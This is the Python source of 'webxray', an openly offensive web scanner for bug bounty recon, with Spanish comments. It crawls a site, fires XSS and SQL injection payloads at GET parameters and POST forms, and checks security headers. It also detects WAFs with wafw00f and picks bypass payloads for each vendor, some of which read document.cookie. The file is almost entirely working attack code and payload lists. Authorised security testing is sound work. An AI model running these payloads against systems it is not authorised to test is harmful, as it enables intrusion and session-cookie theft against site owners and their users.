#!/usr/bin/env python3

"""webxray – escaner ofensivo de vulnerabilidades web.

- Descubre URLs internas a partir de una URL inicial.
- Prueba XSS y SQLi sobre parametros GET y formularios POST.
- Revisa cabeceras de seguridad HTTP.
- Modo --waf-xss: detecta WAF y lanza payloads XSS especificos por WAF.
- Salida opcional en JSON/JSONL.

Pensado para recon / bug bounty como primer filtro rapido.
"""

__version__ = "1.3.0"

import argparse
import json
import random
import signal
import string
import subprocess
import sys
import time
from html import escape as html_escape
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup
from lxml import html
from termcolor import colored
from tqdm import tqdm

DEFAULT_HEADERS: Dict[str, str] = {
    "User-Agent": f"Mozilla/5.0 (compatible; webxray/{__version__} by theoffsecgirl)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"autofocus onfocus=alert(1) x=\"",
]

# Plantillas usadas por check_xss(). El "{token}" se sustituye en tiempo de
# ejecucion por un marcador aleatorio unico por request (ver _gen_xss_token),
# para poder confirmar el reflejo sin ambiguedad frente a contenido casual
# de la pagina. La estructura HTML (<script>, onerror=, comillas rotas...)
# se mantiene igual que en XSS_PAYLOADS porque es lo que permite medir si la
# app escapa o no esos caracteres especiales.
XSS_PAYLOAD_TEMPLATES: List[str] = [
    "<script>alert('{token}')</script>",
    "'><script>alert('{token}')</script>",
    "<img src=x onerror=alert('{token}')>",
    "<svg/onload=alert('{token}')>",
    "\"autofocus onfocus=alert('{token}') x=\"",
]

SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT NULL-- -",
    "\" OR \"1\"=\"1",
    "1' AND SLEEP(3)-- -",
]

SQLI_ERROR_KW: List[str] = [
    "sql syntax", "mysql", "sql server", "sqlite",
    "odbc", "oracle", "pg::", "pdo", "syntax error",
    "unclosed quotation",
]

SECURITY_HEADERS: List[str] = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Strict-Transport-Security",
    "Permissions-Policy",
]

WAF_XSS_PAYLOADS: Dict[str, List[str]] = {
    "akamai": [
        "';k='e'%0Atop //",
        "'><A HRef=' AutoFocus OnFocus=top//?>. >",
    ],
    "cloudflare": [
        "<svg/onload=window>",
        "<Svg Only=1 OnLoad=confirm(document.cookie)>",
    ],
    "cloudfront": [
        "'>'><details/open/ontoggle=confirm('XSS')>",
        "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
    ],
    "modsecurity": [
        "<svg onload='new Function[\"Y000!\"].find(alert)'>",
    ],
    "imperva": [
        "<Img Src=//X55.is OnLoad%0C=import(Src)>",
        "<details open ontoggle=prompt(document.cookie)>",
    ],
    "sucuri": [
        "'><img src=x onerror=alert(document.cookie)>",
        "<button onClick='prompt(1337)'>Submit</button>",
    ],
}


class ScanSession(requests.Session):
    """Session con las opciones globales del escaneo (cabeceras, cookies,
    proxy, TLS y limite de peticiones/segundo compartido entre sesiones).
    Fuerza `verify` para que el `verify=True` de cada llamada no ignore -k."""

    verify_tls: bool = True
    min_interval: float = 0.0
    _last_request: float = 0.0

    def request(self, method, url, *args, **kwargs):  # type: ignore[override]
        kwargs["verify"] = ScanSession.verify_tls
        if ScanSession.min_interval > 0:
            wait = ScanSession._last_request + ScanSession.min_interval - time.monotonic()
            if wait > 0:
                time.sleep(wait)
            ScanSession._last_request = time.monotonic()
        return super().request(method, url, *args, **kwargs)


SCAN_HEADERS: Dict[str, str] = {}
SCAN_PROXIES: Optional[Dict[str, str]] = None


def make_session() -> requests.Session:
    session = ScanSession()
    session.headers.update(DEFAULT_HEADERS)
    session.headers.update(SCAN_HEADERS)
    if SCAN_PROXIES:
        session.proxies.update(SCAN_PROXIES)
    return session


def configure_http(headers: List[str], cookie: Optional[str], proxy: Optional[str],
                   insecure: bool, rate: float) -> None:
    global SCAN_PROXIES
    for raw in headers:
        if ":" not in raw:
            log_error(f"Cabecera invalida (usa 'Nombre: valor'): {raw}")
            sys.exit(2)
        k, v = raw.split(":", 1)
        SCAN_HEADERS[k.strip()] = v.strip()
    if cookie:
        SCAN_HEADERS["Cookie"] = cookie
    if proxy:
        SCAN_PROXIES = {"http": proxy, "https": proxy}
    ScanSession.verify_tls = not insecure
    if insecure:
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    ScanSession.min_interval = 1.0 / rate if rate > 0 else 0.0


def signal_handler(sig, frame):  # type: ignore
    log_warn("Interrumpido por el usuario.")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def log_info(msg: str) -> None:
    print(colored(f"[+] {msg}", "green"), file=sys.stderr)


def log_warn(msg: str) -> None:
    print(colored(f"[!] {msg}", "yellow"), file=sys.stderr)


def log_error(msg: str) -> None:
    print(colored(f"[x] {msg}", "red"), file=sys.stderr)


def normalize_url(base: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "https://" + base
    return base.rstrip("/")


def same_host(start_url: str, candidate: str) -> bool:
    a = urlparse(start_url)
    b = urlparse(candidate)
    return a.netloc == b.netloc or b.netloc == ""


def normalize_finding(finding: dict) -> dict:
    parsed = urlparse(finding.get("url", ""))
    host = parsed.netloc
    finding_type = finding.get("type", "unknown")

    normalized = {
        "type": "candidate",
        "vector": None,
        "target": finding.get("url"),
        "host": host,
        "method": "GET",
        "param": finding.get("parameter"),
        "severity": "medium",
        "confidence": "medium",
        "reason": finding_type,
        "evidence": [],
        "tags": [],
        "raw": finding,
    }

    if finding_type == "xss":
        normalized["vector"] = "xss"
        normalized["evidence"] = ["payload reflected in response"]
        normalized["tags"] = ["reflection", "get-param"]
    elif finding_type == "sqli_get":
        normalized["vector"] = "sqli"
        normalized["evidence"] = ["sql error keyword or response diff detected"]
        normalized["tags"] = ["get-param", "candidate"]
        normalized["severity"] = "high"
    elif finding_type == "sqli_post":
        normalized["vector"] = "sqli"
        normalized["method"] = "POST"
        normalized["evidence"] = ["sql error keyword or response diff detected"]
        normalized["tags"] = ["post-form", "candidate"]
        normalized["severity"] = "high"
    elif finding_type == "missing_header":
        normalized["type"] = "header_issue"
        normalized["vector"] = "headers"
        normalized["severity"] = "low"
        normalized["confidence"] = "high"
        normalized["evidence"] = ["missing security header: {}".format(finding.get("header"))]
        normalized["tags"] = ["header-missing"]
        normalized["param"] = None
    elif finding_type == "waf_xss":
        normalized["vector"] = "xss"
        normalized["evidence"] = ["waf-oriented payload reflected in response"]
        normalized["tags"] = ["waf-bypass", "get-param"]
        normalized["raw"]["waf"] = finding.get("waf")
    elif finding_type == "waf_xss_form":
        normalized["vector"] = "xss"
        normalized["method"] = "POST"
        normalized["evidence"] = ["waf-oriented payload reflected in form response"]
        normalized["tags"] = ["waf-bypass", "form"]
        normalized["raw"]["waf"] = finding.get("waf")
    else:
        normalized["vector"] = finding_type
        normalized["confidence"] = "low"
        normalized["evidence"] = ["generic finding"]

    # check_xss()/_sqli_hit() ya calculan severity/confidence/note por
    # finding (unescaped/escaped/unclear, error_kw/status_size). Si estan
    # presentes, priman sobre los valores genericos de arriba en vez de
    # perder esa precision al normalizar para la salida pipeline.
    if "severity" in finding:
        normalized["severity"] = finding["severity"]
    if "confidence" in finding:
        normalized["confidence"] = finding["confidence"]
    if "note" in finding:
        normalized["evidence"] = [finding["note"]]

    return normalized


def serialize_findings(findings: List[dict], fmt: str) -> str:
    if fmt == "jsonl":
        return "\n".join(json.dumps(f, ensure_ascii=False) for f in findings)
    return json.dumps(findings, indent=2, ensure_ascii=False)


def write_output(findings: List[dict], fmt: str, stdout: bool = False, output_file: Optional[str] = None) -> None:
    payload = serialize_findings(findings, fmt)

    if stdout or output_file == "-":
        print(payload)

    if output_file and output_file != "-":
        with open(output_file, "w", encoding="utf-8") as fout:
            fout.write(payload)
        log_info(f"Resultados guardados en {output_file}")


def discover_urls(start_url: str, max_depth: int = 1, timeout: int = 10) -> List[str]:
    start_url = normalize_url(start_url)
    seen = {start_url}
    queue = [(start_url, 0)]
    discovered: List[str] = []

    session = make_session()

    while queue:
        current, depth = queue.pop(0)
        discovered.append(current)

        if depth >= max_depth:
            continue

        try:
            resp = session.get(current, timeout=timeout, verify=True)
        except requests.RequestException as e:
            log_warn(f"Error al solicitar {current}: {e}")
            continue

        try:
            tree = html.fromstring(resp.text)
        except Exception:
            continue

        for el in tree.xpath("//a[@href]"):
            href = el.get("href")
            if not href:
                continue
            full = urljoin(current, href).split("#", 1)[0]
            if full not in seen and same_host(start_url, full):
                seen.add(full)
                queue.append((full, depth + 1))

    return discovered


def mutate_url_with_payload(url: str, param: str, payload: str) -> Optional[str]:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if param not in qs:
        return None
    qs[param] = payload
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def extract_params(url: str) -> List[str]:
    return list(dict(parse_qsl(urlparse(url).query, keep_blank_values=True)).keys())


def _gen_xss_token() -> str:
    """Marcador corto y unico por request, para confirmar reflejo real."""
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return "wxr" + suffix


def _classify_xss_reflection(payload: str, token: str, body: str) -> Optional[str]:
    """Clasifica el reflejo de un payload XSS en el body de la respuesta.

    Importante: "reflejado" (el string aparece en la pagina) y "reflejado +
    explotable" (el navegador lo interpreta como HTML/JS real, no como texto)
    NO son lo mismo. Una app puede reflejar el input y aun asi ser segura si
    lo hace HTML-escapado. Por eso primero confirmamos el reflejo via el
    token (que no tiene caracteres especiales, sirve solo para localizar
    la respuesta correcta) y despues miramos el CONTEXTO del payload.

    Devuelve:
      None       -> el token ni siquiera aparece: no hubo reflejo, no hay finding.
      "unescaped"-> el payload aparece literal (< > " ' tal cual) -> el
                    navegador lo parsea como marcado/script real -> explotable.
      "escaped"  -> el token se refleja pero el payload solo aparece en su
                    forma HTML-entity-encoded (&lt; &gt; &quot; &#x27;/&#39;)
                    -> se renderiza como texto inerte, no explotable.
      "unclear"  -> el token se refleja pero ni la forma cruda ni la escapada
                    calzan exactas (encoding parcial/atipico) -> se reporta
                    con confianza baja, sin afirmar explotabilidad.
    """
    if token not in body:
        return None
    if payload in body:
        return "unescaped"
    if html_escape(payload) in body:
        return "escaped"
    return "unclear"


_XSS_REFLECTION_INFO = {
    "unescaped": ("high", "reflejo sin escapar - explotable en el navegador"),
    "escaped": ("info", "reflejado pero escapado - no explotable en el navegador"),
    "unclear": ("low", "reflejo detectado pero no se pudo confirmar si esta escapado"),
}


def _detect_xss_context(body: str, payload: str) -> str:
    """Heuristica (NO un parser HTML) para estimar en que zona del documento
    cae un reflejo XSS sin escapar, mirando los caracteres inmediatamente
    antes de la coincidencia. Es una pista de explotabilidad para no tener
    que abrir la respuesta a mano, no una verdad absoluta - confirmar
    siempre en el navegador antes de reportar.

    Devuelve:
      "script-tag"          -> el reflejo cae dentro de un <script>...</script>
                                abierto -> se ejecuta como JS directamente.
      "unquoted-attribute"  -> el reflejo cae dentro de una etiqueta HTML
                                abierta (entre '<' y su '>') sin quedar
                                encerrado en comillas balanceadas -> tipico
                                de inyeccion de atributo sin comillas.
      "plain-text"          -> el reflejo cae en texto normal del body, fuera
                                de cualquier etiqueta abierta.
      "unknown"             -> no se pudo determinar el contexto con esta
                                heuristica (p.ej. dentro de comillas de
                                atributo ya rotas por el propio payload).
    """
    idx = body.find(payload)
    if idx == -1:
        return "unknown"

    before = body[:idx]

    last_script_open = before.lower().rfind("<script")
    last_script_close = before.lower().rfind("</script")
    if last_script_open != -1 and last_script_open > last_script_close:
        return "script-tag"

    last_lt = before.rfind("<")
    last_gt = before.rfind(">")
    if last_lt != -1 and last_lt > last_gt:
        # Dentro de una etiqueta abierta (aun no se ha visto su '>' de cierre).
        segment = before[last_lt:]
        if segment.count('"') % 2 == 0 and segment.count("'") % 2 == 0:
            return "unquoted-attribute"
        return "unknown"

    return "plain-text"


def check_xss(session: requests.Session, url: str, timeout: int) -> List[dict]:
    params = extract_params(url)
    findings: List[dict] = []
    for p in params:
        for template in XSS_PAYLOAD_TEMPLATES:
            token = _gen_xss_token()
            payload = template.format(token=token)
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            reflection = _classify_xss_reflection(payload, token, r.text)
            if reflection is None:
                continue
            severity, note = _XSS_REFLECTION_INFO[reflection]
            context = _detect_xss_context(r.text, payload) if reflection == "unescaped" else "unknown"
            if reflection == "unescaped":
                log_warn(f"Posible XSS en {url} param '{p}' -> '{payload}' [{context}]")
            else:
                log_info(f"Reflejo XSS ({reflection}) en {url} param '{p}'")
            findings.append({
                "type": "xss", "url": url,
                "parameter": p, "payload": payload,
                "status": r.status_code,
                "confidence": reflection,
                "severity": severity,
                "note": note,
                "context": context,
            })
            break
    return findings


_SQLI_HIT_INFO = {
    "error_kw": ("high", "keyword de error SQL en la respuesta"),
    "status_size": (
        "low",
        "status y tamano de respuesta cambiaron a la vez respecto al baseline"
        " - revisar manualmente, puede ser contenido dinamico",
    ),
}


def _sqli_hit(r: requests.Response, baseline: Optional[Tuple[int, int]]) -> Optional[str]:
    """Determina si una respuesta indica una posible inyeccion SQL.

    Devuelve:
      "error_kw"    -> aparecio un keyword de error SQL (sintaxis, motor de
                       BD, etc.) en el body. Senal fuerte por si sola -
                       suficiente para marcar el finding con confianza alta.
      "status_size" -> no hay keyword de error, pero el status Y el tamano
                       de la respuesta cambiaron respecto al baseline A LA
                       VEZ. Por separado, cualquiera de las dos senales es
                       demasiado ruidosa (contenido semi-dinamico: fecha,
                       contador, sesion, ads rotativos) para bastar por si
                       sola, asi que ahora se exigen ambas juntas. Confianza
                       baja/media, requiere revision manual.
      None          -> sin senal de SQLi.
    """
    if any(e in r.text.lower() for e in SQLI_ERROR_KW):
        return "error_kw"

    if baseline:
        baseline_status, baseline_len = baseline
        status_changed = r.status_code != baseline_status
        # Umbral proporcional al tamano de la baseline en vez de un numero
        # fijo: 200 caracteres es mucho de mas en una respuesta pequena
        # (dispara con cualquier ruido) y muy poco en una grande. Se usa un
        # 15% del tamano baseline, con un piso de 100 caracteres para
        # paginas muy pequenas donde un 15% seria trivial.
        size_threshold = max(100, int(baseline_len * 0.15))
        size_changed = abs(len(r.text) - baseline_len) > size_threshold
        if status_changed and size_changed:
            return "status_size"

    return None


def extract_forms(session: requests.Session, url: str, timeout: int = 20) -> List[dict]:
    try:
        r = session.get(url, timeout=timeout, verify=True)
        soup = BeautifulSoup(r.text, "html.parser")
        forms: List[dict] = []
        for form in soup.find_all("form"):
            action = urljoin(url, form.get("action") or url)
            method = form.get("method", "get").lower()
            inputs: Dict[str, str] = {}
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    inputs[name] = tag.get("type", "text")
            if inputs:
                forms.append({"url": action, "method": method, "inputs": inputs})
        log_info(f"Formularios encontrados: {len(forms)}")
        return forms
    except requests.RequestException as e:
        log_error(f"Error al extraer formularios: {e}")
        return []


def check_sqli(session: requests.Session, url: str, timeout: int) -> List[dict]:
    findings: List[dict] = []
    params = extract_params(url)
    baseline: Optional[Tuple[int, int]] = None
    try:
        br = session.get(url, timeout=timeout, verify=True)
        baseline = (br.status_code, len(br.text))
    except requests.RequestException:
        pass

    for p in params:
        for payload in SQLI_PAYLOADS:
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            hit = _sqli_hit(r, baseline)
            if hit:
                severity, note = _SQLI_HIT_INFO[hit]
                log_warn(f"Posible SQLi (GET) en {url} param '{p}' -> '{payload}' [{hit}]")
                findings.append({
                    "type": "sqli_get", "url": url,
                    "parameter": p, "payload": payload,
                    "status": r.status_code,
                    "confidence": hit,
                    "severity": severity,
                    "note": note,
                })
                break

    forms = extract_forms(session, url, timeout=timeout)
    for form in forms:
        if form["method"] != "post":
            continue
        form_url = form["url"]
        base_data = {k: "test" for k in form["inputs"]}
        form_baseline: Optional[Tuple[int, int]] = None
        try:
            br2 = session.post(form_url, data=base_data, timeout=timeout, verify=True)
            form_baseline = (br2.status_code, len(br2.text))
        except requests.RequestException:
            pass

        for input_name in form["inputs"]:
            for payload in SQLI_PAYLOADS:
                data = dict(base_data)
                data[input_name] = payload
                try:
                    r = session.post(form_url, data=data, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                hit = _sqli_hit(r, form_baseline)
                if hit:
                    severity, note = _SQLI_HIT_INFO[hit]
                    log_warn(f"Posible SQLi (POST) en {form_url} campo '{input_name}' [{hit}]")
                    findings.append({
                        "type": "sqli_post", "url": form_url,
                        "parameter": input_name, "payload": payload,
                        "status": r.status_code,
                        "confidence": hit,
                        "severity": severity,
                        "note": note,
                    })
                    break

    return findings


def check_headers(session: requests.Session, url: str, timeout: int) -> List[dict]:
    try:
        r = session.get(url, timeout=timeout, verify=True)
    except requests.RequestException as e:
        log_warn(f"No se pudieron verificar cabeceras en {url}: {e}")
        return []
    missing = [h for h in SECURITY_HEADERS if h not in r.headers]
    if missing:
        log_warn("Cabeceras ausentes en {}: {}".format(url, ", ".join(missing)))
    return [{"type": "missing_header", "url": url, "header": h} for h in missing]


def detect_waf(url: str) -> Optional[str]:
    try:
        result = subprocess.run(
            ["wafw00f", url],
            capture_output=True, text=True, timeout=60,
        )
        output = result.stdout or ""
        if "is behind" in output:
            waf = output.split("is behind")[-1].strip().splitlines()[0]
            log_warn(f"WAF detectado: {waf}")
            return waf
        log_info("No se detecto WAF reconocible.")
        return None
    except FileNotFoundError:
        log_error("wafw00f no instalado: pip install wafw00f")
        return None
    except Exception as e:
        log_error(f"Error al ejecutar wafw00f: {e}")
        return None


def get_waf_payloads(waf: Optional[str]) -> List[str]:
    base = list(XSS_PAYLOADS)
    if not waf:
        return base
    for key, payloads in WAF_XSS_PAYLOADS.items():
        if key in waf.lower():
            log_info(f"Usando payloads especificos para {key}.")
            return payloads + base
    return base


def check_waf_xss(url: str, timeout: int) -> List[dict]:
    log_info("Iniciando modo WAF + XSS avanzado...")
    findings: List[dict] = []

    waf = detect_waf(url)
    payloads = get_waf_payloads(waf)

    params = extract_params(url)
    if params:
        session = make_session()
        for p in params:
            for payload in payloads:
                mutated = mutate_url_with_payload(url, p, payload)
                if not mutated:
                    continue
                try:
                    r = session.get(mutated, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn(f"[WAF-XSS] XSS en '{p}' -> {payload[:60]}...")
                    findings.append({
                        "type": "waf_xss", "url": url,
                        "parameter": p, "payload": payload,
                        "waf": waf or "none", "status": r.status_code,
                    })
                    break

    session = make_session()
    forms = extract_forms(session, url, timeout=timeout)
    for form in forms:
        form_url = form["url"]
        method = form["method"]
        for input_name in form["inputs"]:
            for payload in payloads:
                data = {input_name: payload}
                try:
                    if method == "post":
                        r = session.post(form_url, data=data, timeout=timeout, verify=True)
                    else:
                        r = session.get(form_url, params=data, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn(f"[WAF-XSS] XSS en form '{form_url}' campo '{input_name}'")
                    findings.append({
                        "type": "waf_xss_form", "url": form_url,
                        "parameter": input_name, "payload": payload,
                        "waf": waf or "none", "status": r.status_code,
                    })
                    break

    if not findings:
        log_info("WAF-XSS: sin hallazgos.")
    return findings


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="webxray – escaner ofensivo web by theoffsecgirl"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="URL objetivo (ej: https://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=1,
                        help="Profundidad de crawling (default: 1)")
    parser.add_argument("--no-xss", action="store_true", help="Omitir XSS basico")
    parser.add_argument("--no-sqli", action="store_true", help="Omitir SQLi")
    parser.add_argument("--no-headers", action="store_true", help="Omitir cabeceras")
    parser.add_argument("--waf-xss", action="store_true",
                        help="Modo WAF + XSS avanzado (requiere wafw00f)")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                        help="Timeout en segundos (default: 10)")
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Cabecera extra, repetible (ej: 'X-Bugbounty: user', 'Authorization: Bearer x')")
    parser.add_argument("-c", "--cookie", help="Cookies para zonas autenticadas ('a=1; b=2')")
    parser.add_argument("-x", "--proxy", help="Proxy HTTP(S), ej: http://127.0.0.1:8080 (Burp)")
    parser.add_argument("-k", "--insecure", action="store_true", help="No verificar TLS (util con Burp)")
    parser.add_argument("--rate", type=float, default=0,
                        help="Maximo de peticiones por segundo (default: sin limite)")
    parser.add_argument("--json-output", help="Guardar resultados en JSON/JSONL")
    parser.add_argument("--format", choices=["json", "jsonl"], default="json",
                        help="Formato de salida para export y stdout")
    parser.add_argument("--stdout", action="store_true",
                        help="Enviar findings normalizados a stdout")
    parser.add_argument("-v", "--version", action="version",
                        version=f"webxray {__version__}")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    configure_http(args.header, args.cookie, args.proxy, args.insecure, args.rate)

    start_url = normalize_url(args.url)
    timeout = args.timeout
    all_findings: List[dict] = []

    if args.waf_xss:
        all_findings.extend(check_waf_xss(start_url, timeout=timeout))
    else:
        log_info(f"Descubriendo URLs desde {start_url} (profundidad {args.depth})")
        urls = discover_urls(start_url, max_depth=args.depth, timeout=timeout)
        log_info(f"URLs descubiertas: {len(urls)}")

        session = make_session()

        for u in tqdm(urls, desc="Escaneando", unit="url", file=sys.stderr):
            if not args.no_xss:
                all_findings.extend(check_xss(session, u, timeout=timeout))
            if not args.no_sqli:
                all_findings.extend(check_sqli(session, u, timeout=timeout))
            if not args.no_headers:
                all_findings.extend(check_headers(session, u, timeout=timeout))

    log_info(f"Escaneo completado. Hallazgos: {len(all_findings)}")

    resumen: Dict[str, int] = {}
    for finding in all_findings:
        resumen[finding["type"]] = resumen.get(finding["type"], 0) + 1
    if resumen:
        log_info("Resumen por tipo:")
        for tipo, count in resumen.items():
            print(f"  - {tipo}: {count}", file=sys.stderr)
    else:
        log_info("Sin hallazgos con las heuristicas usadas.")

    normalized_findings = [normalize_finding(f) for f in all_findings]

    if args.json_output or args.stdout:
        try:
            write_output(
                normalized_findings,
                fmt=args.format,
                stdout=args.stdout,
                output_file=args.json_output,
            )
        except OSError as e:
            log_error(f"No se pudo escribir salida: {e}")


if __name__ == "__main__":
    main()
